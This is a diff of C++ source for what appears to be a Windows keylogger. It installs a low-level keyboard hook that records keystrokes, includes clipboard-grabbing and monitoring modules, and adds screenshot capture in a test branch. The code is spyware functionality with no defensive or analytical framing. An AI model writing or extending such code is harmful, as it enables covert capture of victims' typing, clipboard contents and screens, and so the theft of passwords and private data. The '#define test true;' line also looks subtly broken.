@@ -2,6 +2,7 @@
 #include "handleChars.h"
 #include "grabClipboard.h"
 #include "monitor.h"
+#include "takeScreenshot.h"
 
 std::vector<std::string> savedChars = {}; //have to use string for TAB and stuff like that.
 std::vector<std::string> savedSentences = { "" }; //init emtpy string fist off
@@ -42,8 +43,6 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 
 				if (is_control_on) { std::cout << "CTRL + "; }
 				std::cout << handleChars(keyboardStruct->vkCode, is_shift_on) << '\n';
-
-
 			}
 		}
 	}
@@ -58,11 +57,13 @@ LRESULT CALLBACK proc(int code, WPARAM wparam, LPARAM lparam)
 	return CallNextHookEx(NULL, code, wparam, lparam);
 }
 
-#define test false;
+#define test true;
 
 int main()
 {
 #if test
+
+	takeScreenshot(L"C:\\testscreenshot0102.jpeg");
 
 #else
 	handle_to_hook = SetWindowsHookExA(WH_KEYBOARD_LL, proc, NULL, 0);
